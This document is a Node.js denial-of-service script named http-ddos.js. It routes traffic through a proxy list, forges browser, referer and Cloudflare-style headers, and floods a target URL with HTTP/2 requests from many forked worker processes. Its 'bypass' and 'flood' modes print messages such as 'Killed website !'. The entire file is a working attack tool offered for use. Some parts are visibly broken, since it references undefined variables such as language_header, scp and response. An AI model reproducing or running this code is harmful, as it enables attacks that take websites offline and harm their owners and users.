process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
})
process.on("SIGCHILD", () => {
    return 1;
});

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const gradient = require('gradient-string');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const http = require('http');
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
const randomUseragent = require('random-useragent');
var path = require("path");
var fileName = __filename;
var colors = require("colors");
var file = path.basename(fileName);

if (process.argv.length < 7) {
    console.log('[node http-ddos.js <url> <time> <requests> <threads> <proxy> <bypass/flood>]'.bgGreen);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions =
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_NO_TICKET |
crypto.constants.SSL_OP_NO_COMPRESSION |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_TLSEXT_PADDING |
crypto.constants.SSL_OP_ALL |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}
    const args = {
        target: process.argv[2],
        time: process.argv[3],
        rate: process.argv[4],
        threads: process.argv[5],
        proxy: process.argv[6],
        input: process.argv[7],
    }

    const refers = [
        "https://www.google.com/",
        "https://www.facebook.com/",
        "https://www.twitter.com/",
        "https://www.youtube.com/",
        "https://www.linkedin.com/",
        "https://proxyscrape.com/",
        "https://www.instagram.com/",
        "https://wwww.reddit.com/",
        "https://fivem.net/",
        "https://www.fbi.gov/",
        "https://nettruyenplus.com/",
        "https://vnexpress.net/",
        "https://zalo.me",
        "https://shopee.vn",
        "https://www.tiktok.com/",
        "https://google.com.vn/",
        "https://tuoitre.vn/",
        "https://thanhnien.vn/",
     'https://www.google.com',
     'https://www.facebook.com',
     'https://www.twitter.com',
     'https://www.youtube.com',
     'https://www.amazon.com',
     'https://www.netflix.com',
     'https://www.instagram.com',
     'https://www.yahoo.com',
     'https://www.stackoverflow.com',
     'https://www.github.com',
     'https://www.linkedin.com',
     'https://www.cnn.com',
     'https://www.apple.com',
     'https://www.microsoft.com',
     'https://www.wikipedia.org',
     'https://www.nytimes.com',
     'https://www.msn.com',
     'https://www.reddit.com',
     'https://www.quora.com',
     'https://www.npr.org',
     'https://www.bbc.com',
     'https://www.theguardian.com',
     'https://www.huffingtonpost.com',
     'https://www.washingtonpost.com',
     'https://www.wsj.com',
     'https://www.bloomberg.com',
     'https://www.cnbc.com',
     'https://www.merriam-webster.com',
     'https://www.dictionary.com',
     'https://www.thedailybeast.com',
     'https://www.thedailyshow.com',
     'https://www.colbertnation.com',
     'https://www.nationalgeographic.com',
     'https://www.nasa.gov',
     'https://www.nypl.org',
     'https://www.britannica.com',
     'https://www.healthline.com',
     'https://www.webmd.com',
     'https://www.mayoclinic.org',
     'https://www.cdc.gov',
     'https://www.nih.gov',
     'https://www.medlineplus.gov',
     'https://www.cancer.gov',
     'https://www.fda.gov',
     'https://www.nature.com',
     'https://www.sciencemag.org',
     'https://www.scientificamerican.com',
     'https://www.who.int',
     'https://www.un.org',
     'https://www.worldbank.org',
     'https://www.imf.org',
     'https://www.wto.org',
     'https://www.oecd.org',
     'https://www.europa.eu',
     'https://www.nato.int',
     'https://www.icrc.org',
     'https://www.amnesty.org',
     'https://www.hrw.org',
     'https://www.greenpeace.org',
     'https://www.oxfam.org',
     'https://www.doctorswithoutborders.org',
     'https://www.unicef.org',
     'https://www.savethechildren.org',
     'https://www.redcross.org',
     'https://www.wikipedia.org',
     'https://www.wikimedia.org',
     'https://www.mozilla.org',
     'https://www.apache.org',
     'https://www.mysql.com',
     'https://www.php.net',
     'https://www.python.org',
     'https://www.ruby-lang.org',
     'https://www.jquery.com',
     'https://www.reactjs.org',
     'https://www.angularjs.org',
     'https://www.vuejs.org',
     'https://www.bootstrap.com',
     'https://www.materializecss.com',
     'https://www.sass-lang.com',
     'https://www.lesscss.org',
     'https://www.d3js.org',
     'https://www.highcharts.com',
     'https://www.chartjs.org',
     'https://www.mapbox.com',
     'https://www.mapboxgl-js.com',
     'https://www.openstreetmap.org',
     'https://www.mapbox.com',
     'https://www.mapboxgl-js.com',
     'https://www.chartjs.org',
     'https://www.highcharts.com',
     'https://www.d3js.org',
     'https://www.lesscss.org',
     'https://www.sass-lang.com',
     'https://www.materializecss.com',
     'https://www.bootstrap.com',
     'https://www.vuejs.org',
     'https://www.angularjs.org',
     'https://www.reactjs.org',
     'https://www.jquery.com',
     'https://www.ruby-lang.org',
     'https://www.python.org',
     'https://www.php.net',
     'https://www.mysql.com',
     'https://www.apache.org',
     'https://www.mozilla.org',
     'https://www.wikimedia.org',
     'https://www.wikipedia.org',
     'https://www.redcross.org',
     'https://www.savethechildren.org',
     'https://www.unicef.org',
     'https://www.doctorswithoutborders.org',
     'https://www.oxfam.org',
     'https://www.greenpeace.org',
     'https://www.hrw.org',
     'https://www.amnesty.org',
     'https://www.icrc.org',
     'https://www.nato.int',
     'https://www.europa.eu',
     'https://www.oecd.org',
     'https://www.wto.org',
     'https://www.imf.org',
     'https://www.worldbank.org',
     'https://www.un.org',
     'https://www.who.int',
     'https://www.scientificamerican.com',
     'https://www.sciencemag.org',
     'https://www.nature.com',
     'https://www.fda.gov',
     'https://www.cancer.gov',
     'https://www.medlineplus.gov',
     'https://www.nih.gov',
     'https://www.cdc.gov',
     'https://www.mayoclinic.org',
     'https://www.webmd.com',
     'https://www.healthline.com',
     'https://www.britannica.com',
     'https://www.nypl.org',
     'https://www.nasa.gov',
     'https://www.nationalgeographic.com',
     'https://www.colbertnation.com',
     'https://www.thedailyshow.com',
     'https://www.thedailybeast.com',
     'https://www.dictionary.com',
     'https://www.merriam-webster.com',
     'https://www.cnbc.com',
     'https://www.bloomberg.com',
     'https://www.wsj.com',
     'https://www.washingtonpost.com',
     'https://www.huffingtonpost.com',
     'https://www.theguardian.com',
     'https://www.bbc.com',
     'https://www.npr.org',
     'https://www.quora.com',
     'https://www.reddit.com',
     'https://www.msn.com',
     'https://www.nytimes.com',
     'https://www.wikipedia.org',
     'https://www.microsoft.com',
     'https://www.apple.com',
     'https://www.cnn.com',
     'https://www.linkedin.com',
     'https://www.github.com',
     'https://www.stackoverflow.com',
     'https://www.yahoo.com',
     'https://www.instagram.com',
     'https://www.netflix.com',
     'https://www.amazon.com',
     'https://www.youtube.com',
     'https://www.twitter.com',
     'https://www.facebook.com',
     'https://www.google.com',
     "https://nettruyento.com/"
    ];
const accept_header = [
'*/*',
'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
'text/html, application/xhtml+xml, image/jxr, */*',
'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
'application/javascript, */*;q=0.8',
'text/html, text/plain; q=0.6, */*; q=0.1',
'application/graphql, application/json; q=0.8, application/xml; q=0.7',
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"
        ],
         lang_header = [
'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-US,en;q=0.5',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'da, en-gb;q=0.8, en;q=0.7',
  'cs;q=0.5',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8',
          ],
        platform = [
            "Windows",
            "Macintosh",
            "Linux",
            "Android",
            "PlayStation 4",
            "iPhone",
            "iPad",
            "Windows Phone",,
            "iOS",
            "Android",
            "PlayStation 5",
            "Xbox One",
            "Nintendo Switch",
            "Apple TV",
            "Amazon Fire TV",
            "Roku",
            "Chromecast",
            "Smart TV",
            "Other"
        ],
		        cache_header = [
            'max-age=0',
            'no-cache',
            'no-store',
            'must-revalidate',
            'proxy-revalidate',
            's-maxage=604800',
            'no-cache, no-store,private, max-age=0, must-revalidate',
            'no-cache, no-store,private, s-maxage=604800, must-revalidate',
            'no-cache, no-store,private, max-age=604800, must-revalidate',
            'no-transform',
            'only-if-cached',
            'max-age=0',
            'max-age=120',
            'max-age=600578',
            'must-revalidate',
            'public',
            'private',
            'proxy-revalidate',
            '*/*',
            'max-age=604800',
            'max-age=0, private, must-revalidate',
            'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
            'no-cache, no-store, max-age=0, must-revalidate',
            'no-store, no-cache, must-revalidate',
            'public, max-age=0, s-maxage=3600, must-revalidate, stale-while-revalidate=28800',
        ],
        type = [
            "text/plain",
            "text/html",
            "application/json",
            "application/xml",
            "multipart/form-data",
            "application/octet-stream",
            "image/jpeg",
            "image/png",
            "audio/mpeg",
            "video/mp4",
            "application/javascript",
            "application/pdf",
            "application/vnd.ms-excel",
            "application/vnd.ms-powerpoint",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "application/zip",
            "image/gif",
            "image/bmp",
            "image/tiff",
            "audio/wav",
            "audio/midi",
            "video/avi",
            "video/mpeg",
            "video/quicktime",
            "text/csv",
            "text/xml",
            "text/css",
            "text/javascript",
            "application/graphql",
            "application/x-www-form-urlencoded",
            "application/vnd.api+json",
            "application/ld+json",
            "application/x-pkcs12",
            "application/x-pkcs7-certificates",
            "application/x-pkcs7-certreqresp",
            "application/x-pem-file",
            "application/x-x509-ca-cert",
            "application/x-x509-user-cert",
            "application/x-x509-server-cert",
            "application/x-bzip",
            "application/x-gzip",
            "application/x-7z-compressed",
            "application/x-rar-compressed",
            "application/x-shockwave-flash"
          ];
        dest_header = [
            'audio',
            'audioworklet',
            'document',
            'embed',
            'empty',
            'font',
            'frame',
            'iframe',
            'image',
            'manifest',
            'object',
            'paintworklet',
            'report',
            'script',
            'serviceworker',
            'sharedworker',
            "subresource",
            "unknown",
            'style',
            'track',
            'video',
            'worker',
            'xslt',
        ],
        mode_header = [
            'cors',
            'navigate',
            'no-cors',
            'same-origin',
            'websocket'
        ],
        site_header = [
            'cross-site',
            'same-origin',
            'same-site',
            'none'
        ],
        encoding_header = [
            'deflate, gzip;q=1.0, *;q=0.5',
            'gzip, deflate, br',
            'gzip, deflate',
            '*',
        ]

    var proxies = readLines(args.proxy);
    const parsedTarget = url.parse(args.target);

    if (cluster.isMaster) {
        const dateObj = new Date();
        for (let i = 0; i < process.argv[5]; i++) {
            cluster.fork();
        }
        console.clear()
        console.log("HTTP-DDOS BYPASS TESTING ! @tcp_spoofed".rainbow);
        setTimeout(() => {}, process.argv[5] * 1000);
        for (let counter = 1; counter <= args.threads; counter++) {
            cluster.fork();
        }
    } else {
        setInterval(runFlooder)
    }

    class NetSocket {
        constructor() {}

        HTTP(options, callback) {
            const parsedAddr = options.address.split(":");
            const addrHost = parsedAddr[0];
            const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
            const buffer = new Buffer.from(payload);
            const connection = net.connect({
                host: options.host,
                port: options.port,
                allowHalfOpen: true,
                writable: true,
                readable: true
            });

            connection.setTimeout(options.timeout * 20000);
            connection.setKeepAlive(true, 20000);
            connection.setNoDelay(true);
            connection.on("connect", () => {
                connection.write(buffer);
            });

            connection.on("data", chunk => {
                const response = chunk.toString("utf-8");
                const isAlive = response.includes("HTTP/1.1 200");
                if (isAlive === false) {
                    connection.destroy();
                    return callback(undefined, "403");
                }
                return callback(connection, undefined);
            });

            connection.on("timeout", () => {
                connection.destroy();
                return callback(undefined, "403");
            });

            connection.on("error", error => {
                connection.destroy();
                return callback(undefined, "403");
            });
        }
    }
    function getRandomUserAgent() {
        const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
        const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
        const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
        const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
        const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
        const os = osList[Math.floor(Math.random() * osList.length)];
        const browser = browserList[Math.floor(Math.random() * browserList.length)];
        const language = languageList[Math.floor(Math.random() * languageList.length)];
        const country = countryList[Math.floor(Math.random() * countryList.length)];
        const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
        const version = Math.floor(Math.random() * 100) + 1;
        const randomOrder = Math.floor(Math.random() * 6) + 1;
        const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
        const encryptedString = btoa(userAgentString);
        let finalString = '';
        for (let i = 0; i < encryptedString.length; i++) {
          if (i % randomOrder === 0) {
            finalString += encryptedString.charAt(i);
          } else {
            finalString += encryptedString.charAt(i).toUpperCase();
          }
        }
        return finalString;
      }
    const Socker = new NetSocket();
    headers[":method"] = "GET";
    headers[":path"] = parsedTarget.path;
    headers[":scheme"] = parsedTarget.protocol == "https:" ? "https" : "http";
    headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
    headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
    headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
    headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
    headers["sec-ch-ua"] = getRandomUserAgent();
    headers["referer"] = refers[Math.floor(Math.random () * refers.length)];
    headers["origin"] = parsedTarget.protocol + "//" + parsedTarget.host;
    headers["sec-ch-ua-mobile"] = "?0";
    headers["cdn-loop"] = "cloudflare";
    headers["cf-cache-status"] = "DYNAMIC";
    headers["sec-ch-ua-platform"] = platform[Math.floor(Math.random() * platform.length)];
    headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
    headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
    headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
    headers["sec-fetch-user"] = "1";
    headers["upgrade-insecure-requests"] = "1";
    headers["user-agent"] = getRandomUserAgent();
    headers["x-requested-with"] = "XMLHttpRequest";
    headers["cookie"] = cookieString(scp.parse(response["set-cookie"]));
    headers["content-type"] = type[Math.floor(Math.random() * type.length)];

    function runFlooder() {
        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");
		const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"
        let interval
    	if (args.input === 'flood') {
	  process.stdout.write('Sent attack sucsessfully !\r');
	  interval = 1000;
	}
  else if (args.input === 'bypass') {
	  process.stdout.write('Killed website !\r');
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
	  interval = randomDelay(1000, 5000);
	} else {
	  process.stdout.write('default : Skids\r');
	  interval = 1000;
	}

        headers[":authority"] = parsedTarget.host
        headers["x-forwarded-for"] = parsedProxy[0];
        headers["x-forwarded-proto"] = "https";
        const proxyOptions = {
            host: parsedProxy[0],
            port: parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 100
        };

        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) return
            connection.setKeepAlive(true, 100000);
            connection.setNoDelay(true);

            const settings = {
                enablePush: false,
                initialWindowSize: 1073741823
            };

            const tlsOptions = {
                port: 443,
                ALPNProtocols: [
                    "h2", "http/2+quic/43", "http/2+quic/44", "http/2+quic/45"
                ],
                secure: true,
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
                challengeToSolve: Infinity,
                socket: connection,
                ecdhCurve: ecdhCurve,
                honorCipherOrder: false,
				cloudflareTimeout: Infinity,
                cloudflareMaxTimeout: Infinity,
                maxRedirects: Infinity,
                rejectUnauthorized: false,
                servername: url.hostname,
                decodeEmails: false,
                host: parsedTarget.host,
                servername: parsedTarget.host,
                secureOptions: secureOptions,
                secureContext: secureContext,
                secureProtocol: secureProtocol
            };

            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

            tlsConn.allowHalfOpen = true;
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 60 * 100000);
            tlsConn.setMaxListeners(0);

            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: false
                },
                maxSessionMemory: 3333,
                maxDeflateDynamicTableSize: 4294967295,
                createConnection: () => tlsConn,
                socket: connection,
            });

            client.settings({
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            });

            client.setMaxListeners(0);
            client.settings(settings);

            client.on("connect", () => {
                const IntervalAttack = setInterval(() => {
                    for (let i = 0; i < args.rate; i++) {
                        const request = client.request(headers)

                            .on("response", response => {
                                request.close();
                                request.destroy();
                                return
                            });

                        request.end();
                    }
                }, 1000);
            });

            client.on("close", () => {
                client.destroy();
                connection.destroy();
                return
            });

            client.on("error", error => {
                client.destroy();
                connection.destroy();
                return
            });
        });
    }

    const KillScript = () => process.exit();
    setTimeout(KillScript, args.time * 1000);